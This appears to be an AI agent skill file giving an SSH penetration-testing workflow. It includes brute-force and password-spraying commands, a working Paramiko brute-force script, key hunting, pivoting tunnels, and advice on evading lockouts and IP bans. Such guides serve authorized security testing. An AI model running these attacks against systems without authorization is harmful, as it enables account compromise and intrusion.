---
name: ssh-penetration-testing
description: Use this skill when you need to conduct comprehensive SSH security assessments, including enumeration, credential attacks, vulnerability exploitation, tunneling techniques, and post-exploitation activities.
---

# SSH Penetration Testing

## Purpose

Conduct comprehensive SSH security assessments including enumeration, credential attacks, vulnerability exploitation, tunneling techniques, and post-exploitation activities. This skill covers the complete methodology for testing SSH service security.

## Prerequisites

### Required Tools
- Nmap with SSH scripts
- Hydra or Medusa for brute-forcing
- ssh-audit for configuration analysis
- Metasploit Framework
- Python with Paramiko library

### Required Knowledge
- SSH protocol fundamentals
- Public/private key authentication
- Port forwarding concepts
- Linux command-line proficiency

## Outputs and Deliverables

1. **SSH Enumeration Report** - Versions, algorithms, configurations
2. **Credential Assessment** - Weak passwords, default credentials
3. **Vulnerability Assessment** - Known CVEs, misconfigurations
4. **Tunnel Documentation** - Port forwarding configurations

## Core Workflow

### Phase 1: SSH Service Discovery

Identify SSH services on target networks:

```bash
# Quick SSH port scan
nmap -p 22 192.168.1.0/24 --open

# Common alternate SSH ports
nmap -p 22,2222,22222,2200 192.168.1.100

# Full port scan for SSH
nmap -p- --open 192.168.1.100 | grep -i ssh

# Service version detection
nmap -sV -p 22 192.168.1.100
```

### Phase 2: SSH Enumeration

Gather detailed information about SSH services:

```bash
# Banner grabbing
nc 192.168.1.100 22

# Telnet banner grab
telnet 192.168.1.100 22

# Nmap version detection with scripts
nmap -sV -p 22 --script ssh-hostkey 192.168.1.100

# Enumerate supported algorithms
nmap -p 22 --script ssh2-enum-algos 192.168.1.100

# Get host keys
nmap -p 22 --script ssh-hostkey --script-args ssh_hostkey=full 192.168.1.100

# Check authentication methods
nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=root" 192.168.1.100
```

### Phase 3: SSH Configuration Auditing

Identify weak configurations:

```bash
# ssh-audit - comprehensive SSH audit
ssh-audit 192.168.1.100

# ssh-audit with specific port
ssh-audit -p 2222 192.168.1.100
```

Key configuration weaknesses to identify:
- Weak key exchange algorithms (diffie-hellman-group1-sha1)
- Weak ciphers (arcfour, 3des-cbc)
- Weak MACs (hmac-md5, hmac-sha1-96)
- Deprecated protocol versions

### Phase 4: Credential Attacks

#### Brute-Force with Hydra

```bash
# Single username, password list
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100

# Username list, single password
hydra -L users.txt -p Password123 ssh://192.168.1.100

# Username and password lists
hydra -L users.txt -P passwords.txt ssh://192.168.1.100

# With specific port
hydra -l admin -P passwords.txt -s 2222 ssh://192.168.1.100
```

#### Brute-Force with Medusa

```bash
# Basic brute-force
medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh

# Multiple targets
medusa -H targets.txt -u admin -P passwords.txt -M ssh
```

#### Password Spraying

```bash
# Test common password across users
hydra -L users.txt -p Summer2024! ssh://192.168.1.100
```

### Phase 5: Key-Based Authentication Testing

Test for weak or exposed keys:

```bash
# Attempt login with found private key
ssh -i id_rsa user@192.168.1.100

# Specify key explicitly (bypass agent)
ssh -o IdentitiesOnly=yes -i id_rsa user@192.168.1.100
```

Check for exposed keys:

```bash
# Common locations for private keys
~/.ssh/id_rsa
~/.ssh/id_dsa
~/.ssh/id_ecdsa
~/.ssh/id_ed25519
```

### Phase 6: Vulnerability Exploitation

Search for known vulnerabilities:

```bash
# Search for exploits
searchsploit openssh
```

### Phase 7: SSH Tunneling and Port Forwarding

#### Local Port Forwarding

Forward local port to remote service:

```bash
ssh -L 8080:192.168.1.50:80 user@192.168.1.100
```

#### Remote Port Forwarding

Expose local service to remote network:

```bash
ssh -R 8080:localhost:80 user@192.168.1.100
```

#### Dynamic Port Forwarding (SOCKS Proxy)

Create SOCKS proxy for network pivoting:

```bash
ssh -D 1080 user@192.168.1.100
```

### Phase 8: Post-Exploitation

Activities after gaining SSH access:

```bash
# Check sudo privileges
sudo -l

# Find SSH keys
find / -name "id_rsa" 2>/dev/null
```

### Phase 9: Custom SSH Scripts with Paramiko

Python-based SSH automation:

```python
#!/usr/bin/env python3
import paramiko

def ssh_connect(host, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        client.connect(host, username=username, password=password, timeout=5)
        return client
    except paramiko.AuthenticationException:
        return None

def execute_command(client, command):
    stdin, stdout, stderr = client.exec_command(command)
    return stdout.read().decode(), stderr.read().decode()

def ssh_brute_force(host, username, wordlist):
    with open(wordlist, 'r') as f:
        passwords = f.read().splitlines()
    
    for password in passwords:
        client = ssh_connect(host, username, password.strip())
        if client:
            output, _ = execute_command(client, 'id; uname -a')
            print(output)
            client.close()
            return True
    return False
```

### Phase 10: Metasploit SSH Modules

Use Metasploit for comprehensive SSH testing:

```bash
# Start Metasploit
msfconsole

# SSH Version Scanner
use auxiliary/scanner/ssh/ssh_version
set RHOSTS 192.168.1.0/24
run
```

## Quick Reference

### SSH Enumeration Commands

| Command | Purpose |
|---------|---------|
| `nc <host> 22` | Banner grabbing |
| `ssh-audit <host>` | Configuration audit |
| `nmap --script ssh*` | SSH NSE scripts |
| `searchsploit openssh` | Find exploits |

### Brute-Force Options

| Tool | Command |
|------|---------|
| Hydra | `hydra -l user -P pass.txt ssh://host` |
| Medusa | `medusa -h host -u user -P pass.txt -M ssh` |

### Port Forwarding Types

| Type | Command | Use Case |
|------|---------|----------|
| Local | `-L 8080:target:80` | Access remote services locally |
| Remote | `-R 8080:localhost:80` | Expose local services remotely |
| Dynamic | `-D 1080` | SOCKS proxy for pivoting |

### Common SSH Ports

| Port | Description |
|------|-------------|
| 22 | Default SSH |
| 2222 | Common alternate |
| 22222 | Another alternate |

## Constraints and Limitations

### Legal Considerations
- Always obtain written authorization
- Brute-forcing may violate ToS
- Document all testing activities

### Technical Limitations
- Rate limiting may block attacks
- Fail2ban or similar may ban IPs
- Key-based auth prevents password attacks
- Two-factor authentication adds complexity

### Evasion Techniques
- Use slow brute-force: `-t 1 -w 5`
- Distribute attacks across IPs
- Use timing-based enumeration carefully
- Respect lockout thresholds

## Troubleshooting

| Issue | Solutions |
|-------|-----------|
| Connection Refused | Verify SSH running; check firewall; confirm port; test from different IP |
| Authentication Failures | Verify username; check password policy; key permissions (600); authorized_keys format |
| Tunnel Not Working | Check GatewayPorts/AllowTcpForwarding in sshd_config; verify firewall; use `ssh -v` |